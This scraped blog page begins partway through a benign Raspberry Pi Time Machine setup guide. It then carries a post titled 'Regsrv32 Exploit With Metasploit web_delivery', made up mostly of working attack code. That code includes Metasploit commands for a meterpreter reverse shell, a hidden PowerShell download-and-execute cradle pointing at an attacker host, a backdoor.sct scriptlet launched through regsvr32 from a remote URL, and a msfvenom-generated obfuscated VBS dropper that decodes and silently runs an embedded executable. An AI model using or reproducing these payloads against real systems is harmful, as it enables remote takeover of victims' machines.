TYPE=&quot;hfsplus&quot; PARTUUID=&quot;28d26e49-01&quot;</span><br><span class="line">/dev/mmcblk0: PTUUID=&quot;ea0e7380&quot; PTTYPE=&quot;dos&quot;</span><br><span class="line">pi@raspberrypi:~ $ sudo /sbin/parted</span><br><span class="line">GNU Parted 3.2</span><br><span class="line">Using /dev/sda</span><br><span class="line">Welcome to GNU Parted! Type &apos;help&apos; to view a list of commands.</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">(parted) print</span><br><span class="line">Model: WD My Passport 0837 (scsi)</span><br><span class="line">Disk /dev/sda: 2000GB</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags:</span><br><span class="line"></span><br><span class="line">Number  Start   End     Size    Type     File system  Flags</span><br><span class="line"> 1      1049kB  2000GB  2000GB  primary  hfs+         boot</span><br></pre></td></tr></table></figure>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo mkdir -p /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo vim /etc/fstab</span><br><span class="line"># line to add to fstab</span><br><span class="line">/dev/sda1       /media/TimeCapsule   hfsplus force,rw,user,auto  0   0</span><br><span class="line">pi@raspberrypi:~ $ sudo mount -t hfsplus -o force /dev/sda1 /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo chown -R pi:pi /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install netatalk</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/netatalk/AppleVolumes.default</span><br><span class="line">#~/			&quot;Home Directory&quot;</span><br><span class="line">/media/TimeCapsule &quot;Time Capsule&quot; options:tm</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo service netatalk restart</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install avahi-daemon libnss-mdns</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/nsswitch.conf</span><br><span class="line">hosts:      files mdns4_minimal [NOTFOUND=return] dns</span><br><span class="line"></span><br><span class="line">to</span><br><span class="line"></span><br><span class="line">hosts:      files mdns4_minimal [NOTFOUND=return] dns mdns4  mdns</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo vi /etc/avahi/services/afpd.service</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&apos;no&apos;?&gt;&lt;!--*-nxml-*--&gt;</span><br><span class="line">&lt;!DOCTYPE service-group SYSTEM &quot;avahi-service.dtd&quot;&gt;</span><br><span class="line">&lt;service-group&gt;</span><br><span class="line">    &lt;name replace-wildcards=&quot;yes&quot;&gt;%h&lt;/name&gt;</span><br><span class="line">    &lt;service&gt;</span><br><span class="line">        &lt;type&gt;_afpovertcp._tcp&lt;/type&gt;</span><br><span class="line">        &lt;port&gt;548&lt;/port&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">    &lt;service&gt;</span><br><span class="line">        &lt;type&gt;_device-info._tcp&lt;/type&gt;</span><br><span class="line">        &lt;port&gt;0&lt;/port&gt;</span><br><span class="line">        &lt;txt-record&gt;model=TimeCapsule&lt;/txt-record&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">&lt;/service-group&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo vi /usr/local/etc/afp.conf</span><br><span class="line">[Global]</span><br><span class="line">  mimic model = TimeCapsule6,106</span><br><span class="line"></span><br><span class="line">[Time Machine 2TB]</span><br><span class="line">  path = /media/TimeCapsule</span><br><span class="line">  time machine = yes</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo service avahi-daemon start</span><br><span class="line">pi@raspberrypi:~ $ sudo service netatalk start</span><br><span class="line">pi@raspberrypi:~ $ sudo update-rc.d avahi-daemon defaults</span><br><span class="line">pi@raspberrypi:~ $ sudo update-rc.d netatalk defaults</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install hdparm</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/hdparm.conf</span><br><span class="line">command_line &#123;</span><br><span class="line">  hdparm -S 240 /dev/sda</span><br><span class="line">&#125;</span><br><span class="line">pi@raspberrypi:~ $ sudo reboot</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/17/Regsrv32-Exploit-With-Metasploit-web-delivery/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/17/Regsrv32-Exploit-With-Metasploit-web-delivery/" itemprop="url">
-                  Regsrv32 Exploit With Metasploit web_delivery
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-17T00:40:29+08:00">
-                2016-10-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>###0x01 Metasploit web_delivery<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(gitlab_user_enum) &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:2333</span><br><span class="line">[*] Using URL: http://0.0.0.0:9090/WXCOjGGir</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://192.168.0.100:9090/WXCOjGGir</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>backdoor.sct</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">	&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;!-- regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll</span><br><span class="line">	&lt;!-- DFIR --&gt;</span><br><span class="line">	&lt;!--		.sct files are downloaded and executed from a path like this --&gt;</span><br><span class="line">	&lt;!-- Though, the name and extension are arbitary.. --&gt;</span><br><span class="line">	&lt;!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct --&gt;</span><br><span class="line">	&lt;!-- Based on current research, no registry keys are written, since call &quot;uninstall&quot; --&gt;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span><br><span class="line">	&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">			var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);&quot;);</span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;public&gt;</span><br><span class="line">    &lt;method name=&quot;Exec&quot;&gt;&lt;/method&gt;</span><br><span class="line">&lt;/public&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">	function Exec()</span><br><span class="line">	&#123;</span><br><span class="line">		var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>
-<p>###0x02 windows run<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll</span><br></pre></td></tr></table></figure></p>
-<h3 id="0x03-Window-cmd-command-line"><a href="#0x03-Window-cmd-command-line" class="headerlink" title="0x03 Window cmd command line"></a>0x03 Window cmd command line</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.204 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win &gt; test.vbs</span><br><span class="line">&gt; cat test.vbs</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Function sdbyBeauKn(UZpyLbmAYKrH)</span><br><span class="line">	YUwpsWAZxakH = &quot;&lt;B64DECODE xmlns:dt=&quot;&amp; Chr(34) &amp; &quot;urn:schemas-microsoft-com:datatypes&quot; &amp; Chr(34) &amp; &quot; &quot; &amp; _</span><br><span class="line">		&quot;dt:dt=&quot; &amp; Chr(34) &amp; &quot;bin.base64&quot; &amp; Chr(34) &amp; &quot;&gt;&quot; &amp; _</span><br><span class="line">		UZpyLbmAYKrH &amp; &quot;&lt;/B64DECODE&gt;&quot;</span><br><span class="line">	Set UwcHanJT = CreateObject(&quot;MSXML2.DOMDocument.3.0&quot;)</span><br><span class="line">	UwcHanJT.LoadXML(YUwpsWAZxakH)</span><br><span class="line">	sdbyBeauKn = UwcHanJT.selectsinglenode(&quot;B64DECODE&quot;).nodeTypedValue</span><br><span class="line">	set UwcHanJT = nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GocoGnSZ()</span><br><span class="line">	POTnBArG = &quot;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&quot;</span><br><span class="line">	Dim gXjFxrfBUA</span><br><span class="line">	Set gXjFxrfBUA = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">	Dim MiRpqcNrEnOtoGD</span><br><span class="line">	Dim FzkOXxAmmUZ</span><br><span class="line">	Set MiRpqcNrEnOtoGD = gXjFxrfBUA.GetSpecialFolder(2)</span><br><span class="line">	FzkOXxAmmUZ = MiRpqcNrEnOtoGD &amp; &quot;\&quot; &amp; gXjFxrfBUA.GetTempName()</span><br><span class="line">	gXjFxrfBUA.CreateFolder(FzkOXxAmmUZ)</span><br><span class="line">	exOAGCRIezZZb = FzkOXxAmmUZ &amp; &quot;\&quot; &amp; &quot;wdvgyIHBGGhnHe.exe&quot;</span><br><span class="line">	Dim pDdnPksEFDsWCH</span><br><span class="line">	Set pDdnPksEFDsWCH = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">	olyAwkEzotkp = sdbyBeauKn(POTnBArG)</span><br><span class="line">	Set FZVTocmXtqQxKIi = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">	FZVTocmXtqQxKIi.Type = 1</span><br><span class="line">	FZVTocmXtqQxKIi.Open</span><br><span class="line">	FZVTocmXtqQxKIi.Write olyAwkEzotkp</span><br><span class="line">	FZVTocmXtqQxKIi.SaveToFile exOAGCRIezZZb, 2</span><br><span class="line">	pDdnPksEFDsWCH.run exOAGCRIezZZb, 0, true</span><br><span class="line">	gXjFxrfBUA.DeleteFile(exOAGCRIezZZb)</span><br><span class="line">	gXjFxrfBUA.DeleteFolder(FzkOXxAmmUZ)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">GocoGnSZ</span><br></pre></td></tr></table></figure>
